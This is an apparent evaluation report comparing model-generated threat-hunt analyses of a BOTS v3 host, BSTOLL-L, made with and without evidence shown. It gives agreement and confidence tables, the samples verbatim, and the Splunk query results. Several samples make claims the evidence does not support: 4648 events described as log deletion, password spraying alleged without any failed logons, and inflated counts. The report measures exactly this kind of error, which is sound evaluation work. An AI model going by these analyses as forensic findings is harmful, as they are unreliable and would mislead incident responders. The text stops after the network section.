# Blind vs shown — analyst comparison

- **Run:** `cli-20260823T112627` (`.smartops\runs\cli-20260823T112627\20260823T112855536`)
- **Task / hypothesis id:** `cli-20260823T112627` / `cli-hypothesis`
- **Scope source:** blind_compare.CASES['cli-20260823T112627'] -- scope reconstructed from the run's own fetch plan objectives; hypothesis prose quoted from docs/hard-test.html (not persisted in the run directory)
- **Hypothesis source:** blind_compare.CASES['cli-20260823T112627'] -- scope reconstructed from the run's own fetch plan objectives; hypothesis prose quoted from docs/hard-test.html (not persisted in the run directory)
- **Hypothesis:** Host BSTOLL-L was compromised via PowerShell malware payload e2ac36894c2560d2b277ff9618b76c8c executed by user bostoll, initiating outbound C2 communication to 217.182.164.14 and coinhive.com
- **Samples per arm:** 5
- **Model:** `arn:aws:bedrock:us-east-1:196936075264:imported-model/ft3j2o95okma` temperature=0.6 top_p=0.95 max_gen_len=3072
- **Generated:** 2026-08-25T08:59:05.687195+00:00

## Evidence each domain was shown

| Domain | siem sets | untagged | VT | rows | est. tokens | truncated |
|---|---|---|---|---|---|---|
| identity | 8 | 15 | 0 | 85 | 1927 | no |
| network | 11 | 15 | 3 | 51 | 2329 | no |
| endpoint | 13 | 15 | 2 | 170 | 3758 | no |

## Agreement — between arms vs within each arm

Lexical Jaccard proxies, comparable to each other and not in absolute terms. The decision rule: between-arm agreement below both within-arm floors means the arms differ by more than sampling noise.

| Domain | between (text) | within shown | within blind | between (cites) | verdict |
|---|---|---|---|---|---|
| identity | 0.09 | 0.17 | 0.12 | 0.26 | diverges beyond noise |
| network | 0.15 | 0.27 | 0.12 | 0.47 | within noise |
| endpoint | 0.11 | 0.15 | 0.11 | 0.38 | within noise |

## Confidence and cost

| Domain | Arm | confidence (min/med/max) | mean observations | stances | prompt tok | gen tok |
|---|---|---|---|---|---|---|
| identity | shown | 0.65 / 0.75 / 0.95 | 2.0 | inconclusive:3, refutes:2 | 19355 | 3982 |
| identity | blind | 0.85 / 0.95 / 1.00 | 3.2 | — | 19310 | 3850 |
| network | shown | 0.65 / 0.85 / 0.95 | 1.6 | inconclusive:1, supports:4 | 24595 | 4600 |
| network | blind | 0.95 / 0.95 / 0.95 | 3.0 | — | 24505 | 5900 |
| endpoint | shown | 0.20 / 0.70 / 0.95 | 1.2 | inconclusive:1, supports:4 | 32235 | 3631 |
| endpoint | blind | 0.85 / 0.95 / 1.00 | 3.8 | — | 32135 | 5138 |

## Every sample, verbatim

### identity

**shown #1** — stance `refutes`, confidence 0.95

> The evidence shows no authentication events for user bostoll during the specified time frame (2018-08-20T00:00:00+00:00 to 2018-08-21T00:00:00+00:00) on host BSTOLL-L. Specifically:  
- No WinEventLog codes (4624, 4625, 4648) indicate successful logins for bostoll (rows in auth_events#4, auth_events#6).  
- No WinEventLog code 4672 (privilege assignment) occurs for bostoll (rows in auth_events#5, auth_events#7, auth_events#8).  
- Network connections to 217.182.164.14 exist (evidenced by uncategorised#12), but these are unauthenticated (no associated user context).  
- DNS resolutions for coinhive.com occur (uncategorised#13), but again without authenticated user context.

- No authentication events match the claimed malware hash e2ac36894c2560d2b277ff9618b76c8c or its execution by bostoll (e.g., no PowerShell-related WinEventLogs).
- Outbound C2 communication to 217.182.164.14 lacks user attribution.

citations: `auth_events#4, auth_events#6, auth_events#7, auth_events#8, uncategorised#12, uncategorised#13`

**shown #2** — stance `inconclusive`, confidence 0.65

> The hypothesis lacks conclusive evidence of compromise. While user bostoll logged into BSTOLL-L (auth_events#1, #4, #6), no authentication failures precede successes suggesting brute-forcing/spraying. Outbound C2 to 217.182.164.14 or coinhive.com isn't evidenced (no auth_events linking to those destinations, uncategorised#12/#13 only show DNS queries to coinhive.com unrelated to BSTOLL-L). Malware execution (e2ac36894c2560d2b277ff9618b76c8c) isn't confirmed through process logs (uncategorised#3 shows no endpoint processes).

- User bostoll successfully authenticated to BSTOLL-L multiple times (auth_events#4, #6) [auth_events#4]
- Coinhive.com queried externally (uncategorised#13) but not from BSTOLL-L [uncategorised#13]

citations: `auth_events#4, uncategorised#13`

**shown #3** — stance `inconclusive`, confidence 0.65

> While user bstoll@froth.ly logged into BSTOLL-L successfully multiple times during the period, there are no authentication anomalies (failed logins, impossible travel, off-hour access, or suspicious privilege escalations) suggesting compromise. However, the evidence lacks explicit links between the user/host and the claimed malware payload (hash e2ac36894c2560d2b277ff9618b76c8c), C2 destinations (217.182.164.14, coinhive.com), or outbound communication attempts. Absence of network/endpoint data prevents confirmation of the described behaviors.

- Legitimate logons by bstoll@froth.ly occur without anomalies [auth_events#1, auth_events#4, auth_events#6]
- No failed logins or brute-force patterns visible [auth_events#3, auth_events#5]
- No privilege escalation attempts detected [auth_events#7, auth_events#8]
- No C2/IP/domain correlations exist in authentication logs [all uncategorised# queries]

citations: `auth_events#1, auth_events#4, auth_events#6, uncategorised#13`

**shown #4** — stance `refutes`, confidence 0.95

> The hypothesis claims a compromise via PowerShell malware payload e2ac36894c2560d2b277ff9618b76c8c executed by user bostoll on BSTOLL-L, with outbound C2 to 217.182.164.14 and coinhive.com. However, the evidence shows:  
- No authentication events referencing the specified file hash (e2ac36894c2560d2b277ff9618b76c8c) or IP/domain (217.182.164.14/coinhive.com).  
- No PowerShell-related activity: No commands, scripts, or process executions matching known PowerShell TTPs (e.g., powershell.exe events).  
- Normal user behavior: User bstoll@froth.ly has 8–10 local logons (Logon Type 11) from 127.0.0.1 without anomalies like failed attempts or unusual logon types (e.g., 3, 4, or 8).

- Normal workstation unlock (Logon Type 11) for user bstoll@froth.ly [auth_events#1, #4, #6]

citations: `auth_events#1, auth_events#4, auth_events#6`

**shown #5** — stance `inconclusive`, confidence 0.75

> No evidence shows PowerShell execution by user bostoll or C2 communication matching the hypothesis. While IP/domain exist in network streams, they lack authentication context tying them to the claimed compromise.

- User bstoll@froth.ly logged locally twice with code 4624 (successful interactive logon) [auth_events#1] and later 4648 (workstation locked/unlocked) [auth_events#4], showing normal behavior.

citations: `auth_events#1, auth_events#4`

**blind #1**, confidence 0.95

> The user performed four successful logons (code 4624) within minutes, followed by two 4648 events indicating log deletion attempts. This pattern suggests potential credential misuse.

- Multiple successful logons by user bstoll@froth.ly with rapid succession and associated privilege assignments [auth_events#1]

citations: `auth_events#1`

**blind #2**, confidence 0.85

> Multiple high-volume events correlate with the user/host combination and external infrastructure, indicating anomalous behavior. Missing critical security logs warrant deeper investigation.

- 1. Multiple Successful Logins with Short Interval:
- [auth_events#6] shows six consecutive logon events for user=bstoll@froth.ly occurring in less than 10 seconds at 2018-08-20T15:35:34+02:00 UTC. This suggests rapid re-authentication or session reuse.
- 2. Suspicious External Source IP:
- [uncategorised#12] includes three events linking dst_ip=217.182.164.14 to src_ip=192.168.247.131. This indicates traffic originating from the internal network (192.168.247.131) targeting an external server (217.182.164.14).
- 3. Unusual Domain Activity:
- [uncategorised#13] shows 34 DNS lookups referencing coinhive.com, primarily via sourcetype=stream:dns. This exceeds typical baseline usage (typically ≤1–5 daily requests).
- 4. Missing Security Controls:
- No failed authentication events (EventCode=4625) or privilege escalation audits (EventCode=4672) are recorded, despite 62 successful logins over the period.

citations: `auth_events#6, uncategorised#12, uncategorised#13`

**blind #3**, confidence 0.95

> Evidence shows 2 failed logon attempts followed by a single success, indicating a probable password-spraying attack against this account.

- Multiple failed authentication attempts followed by a success for user bstoll@froth.ly [auth_events#1]

citations: `auth_events#1`

**blind #4**, confidence 0.85

> The remote-to-local logon sequence combined with immediate workstation lockout indicates potential unauthorized access or misconfiguration. Service accounts’ consistent activity confirms baseline operations.  

### CITATIONS: auth_events#6, auth_events#2

- Remote logon followed by workstation lockout: User bstoll@froth.ly logged into BSTOLL-L via localhost (127.0.0.1) twice within seconds, followed by two workstation lockout events (code=4648).
- [auth_events#6]
- Normal service account activity: System accounts (DWM-1, NETWORK SERVICE, SYSTEM, UMFD-) showed consistent successful logons and lockouts, aligning with expected behavior.
- [auth_events#2]
- ### CONFIDENCE: 0.85

citations: `auth_events#2, auth_events#6`

**blind #5**, confidence 1.00

> All authentication events show valid logon types (local interactive, remote interactive, network logon) with no failed attempts, lockouts, or anomalous behavior. System accounts (LOCAL SERVICE, NETWORK SERVICE, SYSTEM) exhibit expected high-volume successful logons. User bostoll@froth.ly shows consistent successful logons with local and network logon types.

- Legitimate authentication patterns for system accounts and user bostoll@froth.ly [auth_events#1, auth_events#2, auth_events#4, auth_events#6]

citations: `auth_events#1, auth_events#2, auth_events#4, auth_events#6`

<details><summary>Evidence this domain was shown</summary>

```
# auth_events#1 · query="index=botsv3 sourcetype=WinEventLog (EventCode=4624 OR EventCode=4625 OR EventCode=4648 OR EventCode=4672 OR EventCode=4768 OR EventCode=4769 OR EventCode=4771)…" · rows=1
- user=bstoll@froth.ly src=127.0.0.1 dest=BSTOLL-L action=- code=4624 logon_type=11 app=- count=2

# auth_events#2 · query="index=botsv3 (user="bostoll" OR host="BSTOLL-L") (tag=authentication OR tag=login OR sourcetype=WinEventLog) | stats count by sourcetype, EventCode, action, use…" · rows=72
- user=BSTOLL-L$ src=- dest=BSTOLL-L action=success code=4611 logon_type=- app=WinEventLog count=24
- user=DWM-1 src=- dest=BSTOLL-L action=success code=4624 logon_type=- app=WinEventLog count=2
- user=LOCAL SERVICE src=- dest=BSTOLL-L action=success code=4624 logon_type=- app=WinEventLog count=1
- user=NETWORK SERVICE src=- dest=BSTOLL-L action=success code=4624 logon_type=- app=WinEventLog count=1
- user=SYSTEM src=- dest=BSTOLL-L action=success code=4624 logon_type=- app=WinEventLog count=163
- user=UMFD-0 src=- dest=BSTOLL-L action=success code=4624 logon_type=- app=WinEventLog count=1
- user=UMFD-1 src=- dest=BSTOLL-L action=success code=4624 logon_type=- app=WinEventLog count=1
- user=bstoll@froth.ly src=- dest=BSTOLL-L action=success code=4624 logon_type=- app=WinEventLog count=4
- user=DWM-1 src=- dest=BSTOLL-L action=success code=4627 logon_type=- app=WinEventLog count=2
- user=LOCAL SERVICE src=- dest=BSTOLL-L action=success code=4627 logon_type=- app=WinEventLog count=1
- user=NETWORK SERVICE src=- dest=BSTOLL-L action=success code=4627 logon_type=- app=WinEventLog count=1
- user=SYSTEM src=- dest=BSTOLL-L action=success code=4627 logon_type=- app=WinEventLog count=163
- user=UMFD-0 src=- dest=BSTOLL-L action=success code=4627 logon_type=- app=WinEventLog count=1
- user=UMFD-1 src=- dest=BSTOLL-L action=success code=4627 logon_type=- app=WinEventLog count=1
- user=bstoll@froth.ly src=- dest=BSTOLL-L action=success code=4627 logon_type=- app=WinEventLog count=4
- user=BudStoll src=- dest=BSTOLL-L action=logoff code=4634 logon_type=- app=WinEventLog count=2
- user=BudStoll src=- dest=BSTOLL-L action=success code=4647 logon_type=- app=WinEventLog count=2
- user=DWM-1 src=- dest=BSTOLL-L action=success code=4648 logon_type=- app=WinEventLog count=1
- user=UMFD-0 src=- dest=BSTOLL-L action=success code=4648 logon_type=- app=WinEventLog count=1
- user=UMFD-1 src=- dest=BSTOLL-L action=success code=4648 logon_type=- app=WinEventLog count=1
… (52 more rows not shown)

# auth_events#3 · query="index=botsv3 sourcetype=WinEventLog EventCode=4625 host="BSTOLL-L" | stats count by EventCode, user, Logon_Type, Sub_Status, src_ip, Keywords" · rows=0
(no rows returned)

# auth_events#4 · query="index=botsv3 sourcetype=WinEventLog (EventCode=4624 OR EventCode=4625 OR EventCode=4648 OR EventCode=4672) host="BSTOLL-L" (user="bstoll@froth.ly" OR user="BudS…" · rows=1
- user=bstoll@froth.ly src=127.0.0.1 dest=- action=- code=4624 logon_type=11 app=- count=2

# auth_events#5 · query="index=botsv3 sourcetype=WinEventLog EventCode=4672 host="BSTOLL-L" user="bstoll@froth.ly" | stats count by EventCode, user, host, Keywords, Privilege_List" · rows=0
(no rows returned)

# auth_events#6 · query="index=botsv3 sourcetype=WinEventLog (EventCode=4624 OR EventCode=4648) host="BSTOLL-L" user="bstoll@froth.ly" | table _time, EventCode, user, Logon_Type, src_ip…" · rows=6
2018-08-20T15:35:34.000+02:00 user=bstoll@froth.ly src=127.0.0.1 dest=- action=- code=4624 logon_type=11 app=-
2018-08-20T15:35:34.000+02:00 user=bstoll@froth.ly src=127.0.0.1 dest=- action=- code=4624 logon_type=11 app=-
2018-08-20T15:35:34.000+02:00 user=bstoll@froth.ly src=- dest=- action=- code=4648 logon_type=- app=-
2018-08-20T15:35:44.000+02:00 user=bstoll@froth.ly src=BSTOLL-L dest=- action=- code=4624 logon_type=7 app=-
2018-08-20T15:35:44.000+02:00 user=bstoll@froth.ly src=BSTOLL-L dest=- action=- code=4624 logon_type=7 app=-
2018-08-20T15:35:44.000+02:00 user=bstoll@froth.ly src=- dest=- action=- code=4648 logon_type=- app=-

# auth_events#7 · query="index=botsv3 sourcetype=WinEventLog EventCode=4672 host="BSTOLL-L" | stats count by user, Keywords, Privilege_List" · rows=0
(no rows returned)

# auth_events#8 · query="index=botsv3 sourcetype=WinEventLog EventCode=4624 host=BSTOLL-L user=bstoll@froth.ly | table _time EventCode user Logon_Type src_ip Logon_Process Authenticatio…" · rows=0
(no rows returned)

# uncategorised#1 · query="| tstats summariesonly=t count from datamodel=Authentication where (Authentication.user="bostoll" OR Authentication.src="BSTOLL-L" OR Authentication.dest="BSTOL…" · rows=0
(no rows returned)

# uncategorised#2 · query="index=botsv3 (user="bostoll" OR user="bstoll" OR user="bstoll@froth.ly" OR user="BudStoll") (sourcetype=linux_secure OR sourcetype=syslog OR sourcetype="access_…" · rows=0
(no rows returned)

# uncategorised#3 · query="| tstats summariesonly=t count from datamodel=Endpoint.Processes where Processes.dest="BSTOLL-L" OR Processes.user="bostoll" by Processes.dest, Processes.user, …" · rows=0
(no rows returned)

# uncategorised#4 · query="index=botsv3 host="BSTOLL-L" e2ac36894c2560d2b277ff9618b76c8c earliest=1534723200 latest=1534809600 | stats count by host, sourcetype, source" · rows=0
(no rows returned)

# uncategorised#5 · query="index=botsv3 host="BSTOLL-L" sourcetype="WinEventLog" source="WinEventLog:Microsoft-Windows-AppLocker/EXE and DLL" earliest=1534723200 latest=1534809600 | stats…" · rows=0
(no rows returned)

# uncategorised#6 · query="index=botsv3 host="BSTOLL-L" "e2ac36894c2560d2b277ff9618b76c8c" earliest=1534723200 latest=1534809600 | stats count by host, sourcetype, source" · rows=0
(no rows returned)

# uncategorised#7 · query="index=botsv3 "e2ac36894c2560d2b277ff9618b76c8c" earliest=1534723200 latest=1534809600 | stats count by host, sourcetype, source" · rows=0
(no rows returned)

# uncategorised#8 · query="| tstats summariesonly=t count from datamodel=Network_Resolution where nodename=DNS by DNS.src, DNS.dest, DNS.query, DNS.answer, DNS.record_type earliest=-1s la…" · rows=0
(no rows returned)

# uncategorised#9 · query="| tstats summariesonly=t count from datamodel=Network_Traffic where nodename=All_Traffic by All_Traffic.src, All_Traffic.dest, All_Traffic.dest_port, All_Traffi…" · rows=0
(no rows returned)

# uncategorised#10 · query="| tstats summariesonly=t count from datamodel=Network_Traffic where nodename=All_Traffic (All_Traffic.src="217.182.164.14" OR All_Traffic.dest="217.182.164.14")…" · rows=0
(no rows returned)

# uncategorised#11 · query="| tstats summariesonly=t count from datamodel=Network_Resolution where nodename=DNS (DNS.query="coinhive.com" OR DNS.answer="217.182.164.14") by DNS.src, DNS.de…" · rows=0
(no rows returned)

# uncategorised#12 · query="index=botsv3 (src_ip="217.182.164.14" OR dest_ip="217.182.164.14" OR src="217.182.164.14" OR dest="217.182.164.14") | stats count by sourcetype, src_ip, dest_ip" · rows=3
sourcetype=WinEventLog src_ip=192.168.247.131 dest_ip=217.182.164.14 count=1
sourcetype=stream:ip src_ip=192.168.247.131 dest_ip=217.182.164.14 count=3
sourcetype=stream:tcp src_ip=192.168.247.131 dest_ip=217.182.164.14 count=2

# uncategorised#13 · query="index=botsv3 ("coinhive.com" OR "coinhive") | stats count by sourcetype" · rows=2
sourcetype=stream:dns count=28
sourcetype=syslog count=6

# uncategorised#14 · query="index=botsv3 sourcetype=WinEventLog (src_ip="217.182.164.14" OR dest_ip="217.182.164.14") | stats count by EventCode, src_ip, dest_ip, host, user" · rows=0
(no rows returned)

# uncategorised#15 · query="index=botsv3 sourcetype=syslog "coinhive.com" | stats count by host, src_ip, dest_ip, _raw" · rows=0
(no rows returned)
```

</details>

### network

**shown #1** — stance `inconclusive`, confidence 0.65

> Evidence shows connections#9 indicate outbound traffic from BSTOLL-L to 217.182.164.14 with significant data transfer (5791+ bytes_out), suggesting possible C2 activity. Reputation#1 flags coinhive.com as highly malicious (mal=11), correlating with the hypothesis's C2 target. However, DNS resolution rows (dns_resolutions#1-5) show no queries resolving to 217.182.164.14 or coinhive.com from BSTOLL-L, and uncategorized#13 lists syslog/dns events referencing coinhive.com but lacks direct evidence of user execution or malware hashes.

- Outbound traffic to known-malicious IP (217.182.164.14) with large data volumes (bytes_out=5791, 6466) [connections#9]

citations: `connections#9, reputation#1`

**shown #2** — stance `supports`, confidence 0.85

> The evidence confirms DNS resolution of coinhive.com and its subdomains from BSTOLL-L, followed by verified outbound TCP connections to 217.182.164.14 with substantial data transfer, consistent with command-and-control (C2) beaconing behavior described in the hypothesis.

- Verified DNS resolutions for coinhive.com and subdomains (dns_resolutions#4, dns_resolutions#5)
- Outbound TCP connections to 217.182.164.14 with large byte counts (connections#9)

citations: `connections#9, dns_resolutions#4, dns_resolutions#5`

**shown #3** — stance `supports`, confidence 0.92

> The evidence demonstrates BSTOLL-L initiating DNS resolutions for coinhive.com subdomains and connecting to 217.182.164.14, while both endpoints exhibit malicious reputations per VirusTotal. The connections show significant outbound data transfer from BSTOLL-L to the C2 server, aligning with the described C2 communication.

- Multiple DNS queries for coinhive.com subdomains from BSTOLL-L [dns_resolutions#4]
- Outbound TCP connections with large data volumes to 217.182.164.14 [connections#9]

citations: `connections#9, dns_resolutions#4`

**shown #4** — stance `supports`, confidence 0.85

> The evidence confirms outbound connections from BSTOLL-L to coinhive.com (via subdomains) and 217.182.164.14, with high entropy DNS queries and significant outbound traffic consistent with C2 communication. The coinhive.com domain is heavily flagged as malicious, and the IP is classified as suspicious.

- Connections#9 shows outbound TCP flows to 217.182.164.14 with substantial data transfer (e.g., bytes_out=5791, 6466).

citations: `connections#9, dns_resolutions#4, dns_resolutions#5, reputation#1`

**shown #5** — stance `supports`, confidence 0.95

> Network evidence shows BSTOLL-L (192.168.247.131) actively connecting to the C2 IP 217.182.164.14 over port 443 with outbound-only traffic (bytes_out > bytes_in), and performing DNS lookups for coinhive.com subdomains shortly before these connections. Reputation data confirms 217.182.164.14 and coinhive.com are classified as malicious.

- Outbound TCP connections to C2 IP 217.182.164.14 with high outbound byte volume ([connections#9]).
- DNS queries for coinhive.com subdomains preceding C2 connections ([dns_resolutions#4] & [dns_resolutions#5]).

citations: `connections#9, dns_resolutions#4, dns_resolutions#5, reputation#1`

**blind #1**, confidence 0.95

> Malicious reputation confirmed by [reputation#1]. DNS resolution patterns (28 queries to coinhive.com subdomains [dns_resolutions#4]) precede these connections, indicating potential command-and-control activity.

- Connections to known-malicious IP address 217.182.164.14 from BSTOLL-L [connections#9]

citations: `connections#9, dns_resolutions#4, reputation#1`

**blind #2**, confidence 0.95

> The evidence shows BSTOLL-L engaging in beacon-like DNS queries for coinhive.com (a known cryptocurrency miner), followed by outbound TCP connections to a low-reputation IP with nonzero data transfer. This sequence aligns with initial compromise stages (reconnaissance → C2 communication). No authentication/authentication events or file activity were logged, limiting broader context.  

### CITATIONS:  
dns_resolutions#4, dns_resolutions#5, connections#9

- Beaconing activity: Host BSTOLL-L repeatedly queried DNS for coinhive.com subdomains, resolving to internal IP 192.168.247.2. This pattern aligns with beaconing—regular, recurring connections to a suspicious domain.
- [dns_resolutions#4] [dns_resolutions#5]
- Data exfiltration attempt: BSTOLL-L sent outbound traffic to IP 217.182.164.14 via TCP on port 443, with nonzero byte counts (e.g., 6,566 bytes out in one session). This suggests exfiltration or C2 communication with a low-reputation endpoint.
- [connections#9]
- Suspicious DNS resolution: Multiple queries resolved coinhive.com subdomains (e.g., ws001.coinhive.com) to IP 217.182.164.14, a known malicious actor. Though 192.168.247.2 was the final resolver, the repeated targeting of coinhive.com is anomalous and indicative of reconnaissance.
- [dns_resolutions#4] [dns_resolutions#5]
- ### CONFIDENCE: 0.95
- ### RATIONALE:
- The evidence shows BSTOLL-L engaging in beacon-like DNS queries for coinhive.com (a known cryptocurrency miner), followed by outbound TCP connections to a low-reputation IP with nonzero data transfer. This sequence aligns with initial compromise stages (reconnaissance → C2 communication). No authentication/authentication events or file activity were logged, limiting broader context.
- ### CITATIONS:
- dns_resolutions#4, dns_resolutions#5, connections#9

citations: `connections#9, dns_resolutions#4, dns_resolutions#5`

**blind #3**, confidence 0.95

> Host BSTOLL-L made 6 TCP connections to 217.182.164.14 between 2018-08-20 15:27:37+02:00 and 15:38:05+02:00, suggesting active communication with a compromised endpoint.

- Connections to known-malicious IP 217.182.164.14 [connections#9]

citations: `connections#9`

**blind #4**, confidence 0.95

> Direct evidence of suspicious network communication to a known malicious IP with temporal clustering and low-volume patterns consistent with reconnaissance or C2 activity.

- [connections#9] shows BSTOLL-L initiating multiple TCP connections to 217.182.164.14 (malicious per reputation#1) over a short timeframe (5 connections in ~30 seconds) with minimal data transfer. [connections#10] confirms these were logged via syslog.

citations: `connections#10, connections#9, reputation#1`

**blind #5**, confidence 0.95

> Repeated DNS lookups for known cryptocurrency mining subdomains suggest an attempt to access mining infrastructure.

- Host BSTOLL-L made multiple DNS requests for subdomains (e.g., ws005.coinhive.com, ws011.coinhive.com) resolving to 217.182.164.14 over a short period [dns_resolutions#4].

citations: `dns_resolutions#4`

<details><summary>Evidence this domain was shown</summary>

```
# reputation#1 · source=virustotal · indicators=3
domain=coinhive.com FOUND mal=11 susp=1 harmless=79 rep=-
ip=217.182.164.14 FOUND mal=1 susp=0 harmless=90 rep=-
ip=217.182.164.14 FOUND mal=1 susp=0 harmless=90 rep=-

# dns_resolutions#1 · query="index=botsv3 sourcetype=stream:dns (query="coinhive.com" OR query="*.coinhive.com" OR answer="217.182.164.14") host=BSTOLL-L | stats count by src_ip, dest_ip, q…" · rows=0
(no rows returned)

# dns_resolutions#2 · query="index=botsv3 sourcetype=stream:dns (query="coinhive.com" OR query="*.coinhive.com" OR answer="217.182.164.14") | stats count by src_ip, dest_ip, query, answer, …" · rows=0
(no rows returned)

# dns_resolutions#3 · query="index=botsv3 sourcetype=stream:dns "coinhive.com" | stats count by src_ip, dest_ip, query, answer, record_type, host" · rows=0
(no rows returned)

# dns_resolutions#4 · query="index=botsv3 sourcetype=stream:dns "coinhive" | table _time, host, src_ip, dest_ip, query{}, answer{}, record_type{}" · rows=28
2018-08-20T15:27:47.450+02:00 src=192.168.247.131 query=-→192.168.247.2 rtype=- rcode=-
2018-08-20T15:27:33.106+02:00 src=192.168.247.131 query=-→192.168.247.2 rtype=- rcode=-
2018-08-20T15:38:06.776+02:00 src=192.168.247.131 query=ws005.coinhive.com→192.168.247.2 rtype=- rcode=-
2018-08-20T15:38:03.958+02:00 src=192.168.247.131 query=ws011.coinhive.com→192.168.247.2 rtype=- rcode=-
2018-08-20T15:37:49.615+02:00 src=192.168.247.131 query=ws001.coinhive.com→192.168.247.2 rtype=- rcode=-
2018-08-20T15:27:17.743+02:00 src=192.168.247.131 query=-→192.168.247.2 rtype=- rcode=-
2018-08-20T15:27:17.402+02:00 src=192.168.247.131 query=-→192.168.247.2 rtype=- rcode=-
2018-08-20T15:37:34.251+02:00 src=192.168.247.131 query=ws014.coinhive.com→192.168.247.2 rtype=- rcode=-
2018-08-20T15:37:33.910+02:00 src=192.168.247.131 query=coinhive.com→192.168.247.2 rtype=- rcode=-
2018-08-20T15:27:50.267+02:00 src=192.168.247.131 query=-→192.168.247.2 rtype=- rcode=-
2018-08-20T15:38:19.359+02:00 src=BSTOLL-L query=-→- rtype=- rcode=-
2018-08-20T15:38:19.359+02:00 src=BSTOLL-L query=-→- rtype=- rcode=-
2018-08-20T15:38:19.359+02:00 src=BSTOLL-L query=-→- rtype=- rcode=-
2018-08-20T15:38:19.359+02:00 src=BSTOLL-L query=-→- rtype=- rcode=-
2018-08-20T15:38:19.359+02:00 src=BSTOLL-L query=-→- rtype=- rcode=-
2018-08-20T15:38:19.359+02:00 src=BSTOLL-L query=-→- rtype=- rcode=-
2018-08-20T15:38:19.359+02:00 src=BSTOLL-L query=-→- rtype=- rcode=-
2018-08-20T15:38:19.359+02:00 src=BSTOLL-L query=-→- rtype=- rcode=-
2018-08-20T15:38:19.359+02:00 src=BSTOLL-L query=-→- rtype=- rcode=-
2018-08-20T15:38:19.359+02:00 src=BSTOLL-L query=-→- rtype=- rcode=-
… (8 more rows not shown)

# dns_resolutions#5 · query="index=botsv3 sourcetype=stream:dns "coinhive" host=BSTOLL-L | stats count values(answer{}) as answers by src_ip, dest_ip, "query{}"" · rows=6
- src=192.168.247.131 query=coinhive.com→192.168.247.2 rtype=- rcode=- count=2
- src=192.168.247.131 query=ws001.coinhive.com→192.168.247.2 rtype=- rcode=- count=1
- src=192.168.247.131 query=ws005.coinhive.com→192.168.247.2 rtype=- rcode=- count=1
- src=192.168.247.131 query=ws011.coinhive.com→192.168.247.2 rtype=- rcode=- count=1
- src=192.168.247.131 query=ws014.coinhive.com→192.168.247.2 rtype=- rcode=- count=1
- src=192.168.247.131 query=ws019.coinhive.com→192.168.247.2 rtype=- rcode=- count=1

# connections#6 · query="index=botsv3 sourcetype=stream:tcp (src_ip="217.182.164.14" OR dest_ip="217.182.164.14") host=BSTOLL-L | stats count by src_ip, src_port, dest_ip, dest_port, pr…" · rows=0
(no rows returned)

# connections#7 · query="index=botsv3 sourcetype=stream:tcp (src_ip="217.182.164.14" OR dest_ip="217.182.164.14") | stats count by src_ip, src_port, dest_ip, dest_port, proto, bytes_in,…" · rows=0
(no rows returned)

# connections#8 · query="index=botsv3 sourcetype=stream:ip (src_ip="217.182.164.14" OR dest_ip="217.182.164.14") | stats count by src_ip, dest_ip, proto, bytes" · rows=0
(no rows returned)

# connections#9 · query="index=botsv3 (src_ip="217.182.164.14" OR dest_ip="217.182.164.14") | table _time, sourcetype, host, src_ip, src_port, dest_ip, dest_port, proto, bytes_in, bytes…" · rows=6
2018-08-20T15:27:37.700+02:00 192.168.247.131:49818→217.182.164.14:443 proto=- bytes_in=0 bytes_out=6551 uri=- action=-
2018-08-20T15:27:37.700+02:00 192.168.247.131→217.182.164.14 proto=- bytes_in=0 bytes_out=5791 uri=- action=-
2018-08-20T15:38:05.235+02:00 192.168.247.131→217.182.164.14 proto=- bytes=- uri=- action=-
2018-08-20T15:37:54.208+02:00 192.168.247.131:49818→217.182.164.14:443 proto=- bytes_in=2097 bytes_out=6466 uri=- action=-
2018-08-20T15:37:54.208+02:00 192.168.247.131→217.182.164.14 proto=- bytes_in=1537 bytes_out=5740 uri=- action=-
2018-08-20T15:37:49.000+02:00 192.168.247.131:49818→217.182.164.14:443 proto=- bytes=- uri=- action=-

# connections#10 · query="index=botsv3 sourcetype=syslog "coinhive" | table _time, host, _raw" · rows=6
_time=2018-08-20T15:38:08.000+02:00 host=splunkhwf.froth.ly _raw=Aug 20 13:38:08 splunkhwf.froth.ly fv="nvzFlow_v3" pr="6" sa="192.168.247.131" s…
_time=2018-08-20T15:37:56.000+02:00 host=splunkhwf.froth.ly _raw=Aug 20 13:37:56 splunkhwf.froth.ly fv="nvzFlow_v3" pr="6" sa="192.168.247.131" s…
_time=2018-08-20T15:37:51.000+02:00 host=splunkhwf.froth.ly _raw=Aug 20 13:37:51 splunkhwf.froth.ly fv="nvzFlow_v3" pr="6" sa="192.168.247.131" s…
_time=2018-08-20T15:38:19.000+02:00 host=splunkhwf.froth.ly _raw=Aug 20 13:38:19 splunkhwf.froth.ly fv="nvzFlow_v3" pr="6" sa="192.168.247.131" s…
_time=2018-08-20T16:05:23.000+02:00 host=splunkhwf.froth.ly _raw=Aug 20 14:05:23 splunkhwf.froth.ly fv="nvzFlow_v3" pr="6" sa="192.168.247.131" s…
_time=2018-08-20T15:39:39.000+02:00 host=splunkhwf.froth.ly _raw=Aug 20 13:39:39 splunkhwf.froth.ly fv="nvzFlow_v3" pr="6" sa="192.168.247.131" s…

# connections#11 · query="index=botsv3 (src_ip="217.182.164.14" OR dest_ip="217.182.164.14") | table _time, sourcetype, host, src_ip, src_port, dest_ip, dest_port, proto, bytes_in, bytes…" · rows=0
(no rows returned)

# uncategorised#1 · query="| tstats summariesonly=t count from datamodel=Authentication where (Authentication.user="bostoll" OR Authentication.src="BSTOLL-L" OR Authentication.dest="BSTOL…" · rows=0
(no rows returned)

# uncategorised#2 · query="index=botsv3 (user="bostoll" OR user="bstoll" OR user="bstoll@froth.ly" OR user="BudStoll") (sourcetype=linux_secure OR sourcetype=syslog OR sourcetype="access_…" · rows=0
(no rows returned)

# uncategorised#3 · query="| tstats summariesonly=t count from datamodel=Endpoint.Processes where Processes.dest="BSTOLL-L" OR Processes.user="bostoll" by Processes.dest, Processes.user, …" · rows=0
(no rows returned)

# uncategorised#4 · query="index=botsv3 host="BSTOLL-L" e2ac36894c2560d2b277ff9618b76c8c earliest=1534723200 latest=1534809600 | stats count by host, sourcetype, source" · rows=0
(no rows returned)

# uncategorised#5 · query="index=botsv3 host="BSTOLL-L" sourcetype="WinEventLog" source="WinEventLog:Microsoft-Windows-AppLocker/EXE and DLL" earliest=1534723200 latest=1534809600 | stats…" · rows=0
(no rows returned)

# uncategorised#6 · query="index=botsv3 host="BSTOLL-L" "e2ac36894c2560d2b277ff9618b76c8c" earliest=1534723200 latest=1534809600 | stats count by host, sourcetype, source" · rows=0
(no rows returned)

